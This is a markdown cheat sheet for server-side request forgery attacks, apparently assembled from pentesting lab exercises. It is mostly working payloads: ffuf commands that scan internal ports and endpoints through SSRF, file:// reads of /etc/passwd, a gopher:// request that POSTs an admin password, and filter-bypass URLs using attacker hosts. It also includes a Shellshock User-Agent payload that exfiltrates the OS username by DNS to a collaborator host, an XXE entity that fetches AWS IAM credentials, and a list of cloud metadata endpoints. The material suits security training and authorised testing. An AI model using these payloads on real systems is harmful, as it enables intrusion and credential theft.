# SSRF Cheat Sheet

> **Server-Side Request Forgery (SSRF)** — trick a server into making HTTP requests on your behalf to internal systems, bypassing firewalls and accessing restricted resources.

---

**Overall:**
```
SSRF - Pentester Mindset Map
├── 1. Identify
│   ├── Netcat Listener → Use your IP to catch outbound request
│   └── Self-Reflect Test → http://127.0.0.1:PORT/index.php
│
├── 2. Enumerate
│   ├── Port Enumeration
│   │   └── ffuf -w ./ports.txt -u http://TARGET-IP/index.php -X POST \
│   │       -H "Content-Type: application/x-www-form-urlencoded" \
│   │       -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
│   │       -fr "Failed to connect to"
│   │
│   ├── Endpoint Enumeration
│   │   └── ffuf -w raft-small-words.txt -u http://TARGET-IP/index.php -X POST \
│   │       -H "Content-Type: application/x-www-form-urlencoded" \
│   │       -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
│   │       -fr "Server at dateserver.htb Port 80"
│   │
│   └── LFI via SSRF
│       └── dateServer=file:///etc/passwd&date=2024-01-01
│
└── 3. Advanced - Gopher Protocol
    ├── Purpose: Send arbitrary bytes to a TCP socket
    ├── Use Case: Craft raw HTTP requests (POST, PUT, etc.)
    └── Goal: Internal service abuse (e.g., Redis, HTTP APIs, etc.)
```

**Bypass:**
```
SSRF - Circumventing Common Defenses
├── 1. Blacklist Filters
│   ├── Alternative IP Representations
│   │   ├── Decimal → http://2130706433
│   │   ├── Octal → http://0177.0.0.1
│   │   └── Hex → http://0x7f000001
│   ├── Use a Domain that Resolves to 127.0.0.1
│   ├── Obfuscate Blocked Strings (e.g., "localhost", "admin")
│   └── Controlled Redirects
│       └── Use your own domain to redirect to internal IP
│
├── 2. Whitelist Filters
│   ├── URL Credential Injection
│   │   └── https://expected-host:fakepass@evil.com
│   ├── Fragment Injection
│   │   └── https://evil.com#expected.com
│   ├── Subdomain Trick
│   │   └── https://expected.evil.com
│   ├── URL Encoding
│   │   ├── Single encoding → %2e, %2f, etc.
│   │   └── Double encoding → %%32%65
│   └── Combine Techniques
│       └── Step-by-step chaining to bypass layered filters
│
└── 3. Open Redirects
    ├── Abuse redirection parameters
    │   └── /product/nextProduct?currentProductId=6&path=http://evil-user.net
    └── Redirect chain → External → Internal
```

**Blind:**
```
Blind SSRF – Pentester Mindset Map
├── 1. Finding Hidden SSRF Attack Surface
│   ├── Partial URLs in Parameters
│   │   └── App constructs full URL on server-side (e.g., user provides only hostname)
│   ├── URLs Embedded in Data Formats
│   │   └── XML → XXE → SSRF (parser loads URL internally)
│   └── Referer Header Exploitation
│       └── Analytics software visits Referer URLs
│           └── Can trigger SSRF when Referer is attacker-controlled
│
├── 2. Exploiting Blind SSRF
│   ├── Challenge: No Direct Response
│   ├── Local Port Scanning via Behavior Differences
│   │   ├── Closed Port → "Something went wrong!"
│   │   └── Open Port → "Date is unavailable..."
│   ├── Enumerate Internal Services Based on Response
│   ├── File Existence Inference
│   │   └── Existing file → Subtle message or valid response
│   │   └── Non-existent file → Error or fail message
│   └── Mindset:
│       ├── “Look for timing, behavioral, or error-based clues.”
│       └── “Blind ≠ impossible. It just means be patient and clever.”
```

### Exploitation
- Internal port scanning by accessing ports on localhost
- Accessing restricted endpoints

### Protocol Examples
```
http://127.0.0.1/
file:///etc/passwd
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

---

## Table of Contents

- [1. Key URL Schemes](#1-key-url-schemes)
- [2. Confirming SSRF](#2-confirming-ssrf)
- [3. Internal Port Scanning via SSRF](#3-internal-port-scanning-via-ssrf)
- [4. Exploitation](#4-exploitation)
  - [4.1 Access Restricted Internal Endpoints](#41-access-restricted-internal-endpoints)
  - [4.2 Local File Read (LFI via `file://`)](#42-local-file-read-lfi-via-file)
  - [4.3 POST Requests via `gopher://`](#43-post-requests-via-gopher)
- [5. Bypassing SSRF Defenses](#5-bypassing-ssrf-defenses)
  - [5.1 Blacklist Bypass](#51-blacklist-bypass-blocked-127001-localhost-admin)
  - [5.2 Whitelist Bypass](#52-whitelist-bypass-app-only-allows-specific-domains)
  - [5.3 Bypass via Open Redirect](#53-bypass-via-open-redirect)
- [6. Blind SSRF](#6-blind-ssrf)
  - [6.1 Basic OOB Detection](#61-basic-oob-detection)
  - [6.2 Shellshock + Blind SSRF](#62-shellshock--blind-ssrf-rce--dns-exfil)
  - [6.3 Blind SSRF Port Scan & File Enum](#63-blind-ssrf-port-scan--file-enum)
- [7. Hidden SSRF Attack Surface](#7-hidden-ssrf-attack-surface)
  - [7.1 Partial URLs in Parameters](#71-partial-urls-in-parameters)
  - [7.2 XXE → SSRF via XML Data Formats](#72-xxe--ssrf-via-xml-data-formats)
  - [7.3 SSRF via Referer Header](#73-ssrf-via-referer-header)
- [8. Cloud Metadata Endpoints](#8-cloud-metadata-endpoints)
- [Quick Reference: Tools](#quick-reference-tools)

---

## 1. Key URL Schemes

| Scheme | Use |
|---|---|
| `http://` / `https://` | Bypass WAFs, access internal endpoints, restricted APIs |
| `file://` | Read local files (LFI) — e.g. `file:///etc/passwd` |
| `gopher://` | Send arbitrary TCP bytes — POST requests, SMTP, Redis, MySQL |

---

## 2. Confirming SSRF

**Step 1 — Point the vulnerable param at your server:**
```
dateServer=http://YOUR-IP:8000/ssrf&date=2024-01-01
```

**Step 2 — Listen for the callback:**
```bash
nc -lnvp 8000
```

**Step 3 — Point back at the app itself to check reflected response:**
```
dateServer=http://127.0.0.1/index.php&date=2024-01-01
```

---

## 3. Internal Port Scanning via SSRF

```bash
# Generate wordlist
seq 1 10000 > ports.txt

# Fuzz open ports — filter closed-port error message
ffuf -w ./ports.txt \
  -u http://TARGET/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Failed to connect to"
```

---

## 4. Exploitation

### 4.1 Access Restricted Internal Endpoints

```bash
# Directory brute-force through SSRF (filter Apache 403 error string)
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -u http://TARGET/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://internal.host/FUZZ.php&date=2024-01-01" \
  -fr "Server at dateserver.htb Port 80"
```

### 4.2 Local File Read (LFI via `file://`)

```
dateServer=file:///etc/passwd&date=2024-01-01
```

### 4.3 POST Requests via `gopher://`

Use when you need to send POST data to an internal endpoint that only accepts POST.

**Build the raw HTTP request, then URL-encode it:**
```
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

**Encode spaces → `%20`, newlines → `%0D%0A`, then prefix with `gopher://host:port/_`:**
```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

> **Double-encode** the entire gopher URL if sending it inside another URL-encoded POST param.

**Use Gopherus to auto-generate gopher payloads:**
```bash
python2.7 gopherus.py --exploit smtp   # or mysql, redis, fastcgi, etc.
```

**Gopherus supported targets:** MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache

---

## 5. Bypassing SSRF Defenses

### 5.1 Blacklist Bypass (blocked: `127.0.0.1`, `localhost`, `/admin`)

| Technique | Example |
|---|---|
| Decimal IP | `2130706433` |
| Octal IP | `0177.0.0.1` |
| Hex IP | `0x7f000001` |
| Mixed/Short | `127.1` |
| Redirector domain | `spoofed.burpcollaborator.net` |
| URL encoding | `%31%32%37%2e%30%2e%30%2e%31` |
| Case variation | `/admiN/` |
| HTTP → HTTPS redirect | Bypass some filters mid-redirect |

```
stockApi=http://127.1/admiN/
```

### 5.2 Whitelist Bypass (app only allows specific domains)

| Technique | Example |
|---|---|
| Embed creds with `@` | `https://expected-host:fakepassword@evil-host` |
| Fragment with `#` | `https://evil-host#expected-host` |
| Subdomain trick | `https://expected-host.evil-host` |
| URL-encode chars | `%2523` (double-encoded `#`) |
| Double encoding | Server decodes twice → second decode hits filter differently |

**Progression example:**
```
http://something.ofsomething.net                        ← original
http://testusername@something.ofsomething.net           ← add creds
http://testusername#@something.ofsomething.net          ← add #
http://testusername%2523@something.ofsomething.net      ← URL-encode #
http://evilhost%2523@stock.weliketoshop.net/...         ← full bypass
```

> Combine techniques step by step.

### 5.3 Bypass via Open Redirect

If a whitelisted domain has an open redirect, chain it:

```
# Redirect gadget on allowed domain:
/product/nextProduct?currentProductId=6&path=http://evil-user.net

# Chain it in the SSRF param:
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

The app validates the domain (passes), then follows the redirect to your internal target.

---

## 6. Blind SSRF

Response not returned to attacker — use **Out-of-Band (OAST)** detection.

> **Prefer DNS callbacks over HTTP** — HTTP often blocked by network filtering.

### 6.1 Basic OOB Detection

```
GET /product?productId=18 HTTP/2
Host: website.net
Referer: http://YOUR-BURP-COLLABORATOR-PAYLOAD
```

### 6.2 Shellshock + Blind SSRF (RCE → DNS Exfil)

**Scenario:** Analytics fetches `Referer` URL server-side. Internal host runs Bash vulnerable to Shellshock.

```
GET /product?productId=1 HTTP/2
Host: <lab>.web-security-academy.net
Referer: http://192.168.0.§1§:8080
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).<collaborator-payload>.oastify.com
```

**Attack flow:**
1. Install **Collaborator Everywhere** (BApp Store)
2. Confirm `User-Agent` appears in Collaborator interactions
3. Send to **Intruder** — fuzz `Referer` IP last octet `1–255`
4. Shellshock payload in `User-Agent` triggers DNS lookup with `$(whoami)` in subdomain
5. Poll Collaborator → OS username exfiltrated

### 6.3 Blind SSRF Port Scan & File Enum

Infer open/closed from error message difference:
- **Closed port / non-existent file** → generic error (e.g. `Something went wrong!`)
- **Open port / existing file** → different response (e.g. `Date is unavailable`)

> Services not responding with valid HTTP may be invisible.

---

## 7. Hidden SSRF Attack Surface

### 7.1 Partial URLs in Parameters

App builds full URL server-side from partial user input:
```
server=internal-api&path=/reports/summary
→ constructs: http://internal-api/reports/summary
```
Try substituting `server=169.254.169.254` (AWS metadata) or internal hostnames.

### 7.2 XXE → SSRF via XML Data Formats

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 7.3 SSRF via Referer Header

Analytics software crawls `Referer` URLs server-side:
```
GET /product?id=5 HTTP/1.1
Host: example.com
Referer: http://192.168.0.1/admin
```

---

## 8. Cloud Metadata Endpoints

| Provider | URL |
|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| AWS IMDSv2 token | `http://169.254.169.254/latest/api/token` |
| AWS IAM creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |

---

## Quick Reference: Tools

| Tool | Purpose |
|---|---|
| `ffuf` | Port scan / dir brute-force via SSRF |
| `nc -lnvp` | Confirm SSRF callback |
| `gopherus` | Generate gopher:// payloads for internal services |
| Burp Collaborator | OOB detection for blind SSRF |
| Collaborator Everywhere (BApp) | Auto-inject Collaborator payloads |

---

*Reference: PortSwigger URL validation bypass cheat sheet — https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet*
